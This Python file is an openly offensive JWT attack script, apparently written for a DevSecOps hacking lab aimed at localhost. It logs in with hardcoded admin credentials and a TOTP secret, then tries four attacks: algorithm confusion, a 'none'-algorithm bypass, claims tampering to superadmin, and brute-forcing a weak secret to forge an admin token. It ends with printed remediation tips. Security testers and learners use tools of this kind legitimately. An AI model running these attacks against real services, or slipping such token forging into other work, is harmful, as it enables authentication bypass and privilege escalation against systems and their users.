#!/usr/bin/env python3
"""
Intelligent Token Replay Attack
Advanced JWT manipulation and exploitation.

UPGRADES:
- Algorithm confusion (RS256 → HS256)
- None algorithm bypass
- Claims tampering (role, exp)
- Secret brute force
"""

import asyncio
import httpx
import json
import pyotp
from datetime import datetime
from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

from jwt_manipulation import JWTManipulator


class IntelligentTokenReplay:
    """Advanced JWT attack with manipulation techniques"""

    def __init__(self, target: str = "http://localhost:8080"):
        self.target = target
        self.console = Console()
        self.manipulator = JWTManipulator()

        self.results = {
            "attack_name": "Intelligent Token Replay",
            "timestamp": datetime.now().isoformat(),
            "tests": [],
            "successful_attacks": 0,
        }

    def banner(self):
        banner_text = """
[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]
[bold white]🔐 INTELLIGENT JWT MANIPULATION ATTACK[/bold white]
[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]

[yellow]Target:[/yellow] {target}

[bold green]TECHNIQUES:[/bold green]
  • Algorithm confusion (RS256 → HS256)
  • None algorithm bypass
  • Claims tampering (role, exp, user_id)
  • Secret brute force (weak secrets)

[bold cyan]═══════════════════════════════════════════════════════════════════[/bold cyan]
""".format(target=self.target)
        self.console.print(Panel(banner_text, border_style="cyan"))

    async def obtain_token(self) -> str:
        """Obtain valid JWT token"""
        self.console.print("\n[bold][*][/bold] Obtaining valid JWT token...")

        async with httpx.AsyncClient(timeout=10.0) as client:
            # Login
            login_resp = await client.post(
                f"{self.target}/auth/login",
                json={"username": "admin", "password": "admin123"}
            )

            if login_resp.status_code != 200:
                self.console.print("[red][✗][/red] Login failed")
                return ""

            challenge_id = login_resp.json()["challenge_id"]

            # MFA
            totp = pyotp.TOTP("DEVSECOPSTWENTYFOURHACKINGLAB", interval=30)
            mfa_code = totp.now()

            mfa_resp = await client.post(
                f"{self.target}/auth/mfa/verify",
                json={"challenge_id": challenge_id, "code": mfa_code}
            )

            if mfa_resp.status_code != 200:
                self.console.print("[red][✗][/red] MFA failed")
                return ""

            token = mfa_resp.json()["access_token"]
            self.console.print(f"[green][✓][/green] Token obtained")

            # Decode and show
            decoded = self.manipulator.decode_jwt(token)
            self.console.print(f"    Algorithm: {decoded['header']['alg']}")
            self.console.print(f"    User: {decoded['payload'].get('sub')}")

            return token

    async def test_algorithm_confusion(self, token: str):
        """Test algorithm confusion attack"""
        self.console.print("\n[bold][*][/bold] Test: Algorithm Confusion (HS256)")

        # Create confused token
        confused = self.manipulator.algorithm_confusion_attack(token)

        self.console.print(f"    [blue][>][/blue] Modified algorithm to HS256")

        # Try to use it
        async with httpx.AsyncClient(timeout=5.0) as client:
            try:
                resp = await client.get(
                    f"{self.target}/api/profile",
                    headers={"Authorization": f"Bearer {confused}"}
                )

                if resp.status_code == 200:
                    self.console.print(f"    [red][!][/red] VULNERABILITY: Algorithm confusion worked!")
                    self.results["successful_attacks"] += 1
                else:
                    self.console.print(f"    [green][✓][/green] Protected: HTTP {resp.status_code}")

            except:
                self.console.print(f"    [green][✓][/green] Protected: Request rejected")

        self.results["tests"].append({"name": "Algorithm Confusion", "token": confused[:50]})

    async def test_none_algorithm(self, token: str):
        """Test none algorithm bypass"""
        self.console.print("\n[bold][*][/bold] Test: None Algorithm Bypass")

        # Create none algorithm token
        none_token = self.manipulator.none_algorithm_attack(token)

        self.console.print(f"    [blue][>][/blue] Set algorithm to 'none', removed signature")

        async with httpx.AsyncClient(timeout=5.0) as client:
            try:
                resp = await client.get(
                    f"{self.target}/api/profile",
                    headers={"Authorization": f"Bearer {none_token}"}
                )

                if resp.status_code == 200:
                    self.console.print(f"    [red][!][/red] CRITICAL: None algorithm accepted!")
                    self.results["successful_attacks"] += 1
                else:
                    self.console.print(f"    [green][✓][/green] Protected: HTTP {resp.status_code}")

            except:
                self.console.print(f"    [green][✓][/green] Protected: Request rejected")

        self.results["tests"].append({"name": "None Algorithm", "token": none_token[:50]})

    async def test_claims_tampering(self, token: str):
        """Test claims tampering"""
        self.console.print("\n[bold][*][/bold] Test: Claims Tampering")

        # Tamper with claims
        tampered = self.manipulator.claims_tampering(
            token,
            {
                "role": "superadmin",
                "exp": 9999999999,
                "user_id": 1
            }
        )

        self.console.print(f"    [blue][>][/blue] Modified: role=superadmin, exp=9999999999")

        async with httpx.AsyncClient(timeout=5.0) as client:
            try:
                resp = await client.get(
                    f"{self.target}/api/admin",
                    headers={"Authorization": f"Bearer {tampered}"}
                )

                if resp.status_code == 200:
                    self.console.print(f"    [red][!][/red] VULNERABILITY: Tampered claims accepted!")
                    self.results["successful_attacks"] += 1
                else:
                    self.console.print(f"    [green][✓][/green] Protected: Signature verification works")

            except:
                self.console.print(f"    [green][✓][/green] Protected: Request rejected")

        self.results["tests"].append({"name": "Claims Tampering"})

    async def test_secret_brute_force(self, token: str):
        """Test weak secret brute force"""
        self.console.print("\n[bold][*][/bold] Test: Secret Brute Force")

        wordlist = self.manipulator.get_common_secrets()
        self.console.print(f"    [blue][>][/blue] Testing {len(wordlist)} common secrets...")

        found = self.manipulator.brute_force_secret(token, wordlist)

        if found:
            self.console.print(f"    [red][!][/red] CRITICAL: Weak secret found: '{found}'")
            self.results["successful_attacks"] += 1

            # Try to create admin token with found secret
            admin_token = self.manipulator.claims_tampering(
                token,
                {"role": "admin", "user_id": 1},
                secret=found
            )

            self.console.print(f"    [yellow][>][/yellow] Created admin token with found secret")

        else:
            self.console.print(f"    [green][✓][/green] Secret not in common wordlist")

        self.results["tests"].append({"name": "Secret Brute Force", "found": found})

    async def display_summary(self):
        """Display attack summary"""
        self.console.print("\n" + "="*70)
        self.console.print("[bold cyan]📊 ATTACK SUMMARY[/bold cyan]")
        self.console.print("="*70)

        summary_table = Table(show_header=True, header_style="bold magenta")
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="green")

        summary_table.add_row("Tests Performed", str(len(self.results["tests"])))
        summary_table.add_row("Successful Attacks", str(self.results["successful_attacks"]))

        self.console.print(summary_table)

        if self.results["successful_attacks"] > 0:
            self.console.print("\n[bold red]⚠️  JWT VULNERABILITIES FOUND[/bold red]")

    def save_report(self):
        """Save JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = Path("results")
        output_dir.mkdir(exist_ok=True)

        filename = output_dir / f"intelligent_token_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)

        self.console.print(f"\n[green][✓][/green] Report saved to: {filename}")

    async def run(self):
        """Execute attack"""
        self.banner()

        # Obtain token
        token = await self.obtain_token()
        if not token:
            self.console.print("[red][✗][/red] Failed to obtain token")
            return

        # Run tests
        await self.test_algorithm_confusion(token)
        await self.test_none_algorithm(token)
        await self.test_claims_tampering(token)
        await self.test_secret_brute_force(token)

        await self.display_summary()
        self.save_report()

        self.console.print("\n[bold yellow]💡 REMEDIATION:[/bold yellow]")
        self.console.print("   1. Use RS256 (asymmetric) instead of HS256")
        self.console.print("   2. Reject 'none' algorithm explicitly")
        self.console.print("   3. Use strong secrets (256-bit random)")
        self.console.print("   4. Validate all claims server-side")
        self.console.print()


async def main():
    attack = IntelligentTokenReplay()
    await attack.run()


if __name__ == "__main__":
    import sys
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
        sys.exit(1)
